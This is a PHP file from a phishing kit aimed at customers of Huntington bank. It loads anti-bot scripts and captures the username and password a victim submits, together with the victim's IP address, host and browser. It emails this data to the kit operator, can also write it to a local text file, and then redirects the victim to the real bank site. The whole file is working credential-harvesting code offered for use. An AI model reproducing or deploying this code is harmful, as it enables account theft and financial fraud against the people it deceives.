<?php

/*

    CREDIT: @RETRO_CODER

*/
    error_reporting(0);
    include('Email.php');

    require 'prevents/anti1.php';
    require 'prevents/anti3.php';
    require 'prevents/anti4.php';
    require 'prevents/anti5.php';
    require 'prevents/anti6.php';
    require 'prevents/anti7.php';
    require 'prevents/anti8.php';
    require 'prevents/antibots.php';
    require 'prevents/bt.php';
    require "prevents/blocker.php";



    IF($ENGINE_START === TRUE){
        $ip = getenv("REMOTE_ADDR");
        $message .= "--------------------@RETRO_CODER-------------------\n";
        $message .= "--------------  LOGIN -------------\n";
        $message .= "EMAIL       : ".$_POST['Username']."\n";
        $message .= "PASSWORD       : ".$_POST['Password']."\n";
        $message .= "-------------- IP Infos ------------\n";
        $message .= "IP      : $ip\n";
        $message .= "HOST    : ".gethostbyaddr($ip)."\n";
        $message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
        $message .= "----------------------@RETRO_CODER----------------------\n";
        $subject = "Email account";
        $headers = "From: <noreply@".$YOUR_DOMAIN_NAME.">";

        mail($WORKING_MAIL, $subject, $message, $headers);
            
        IF($WRITE_TO_DISK_CONTROLLER === TRUE){
            $text = fopen('DATA.txt', 'a');
            fwrite($text, $message);
        }
    }


header("Location: https://www.huntington.com");

?>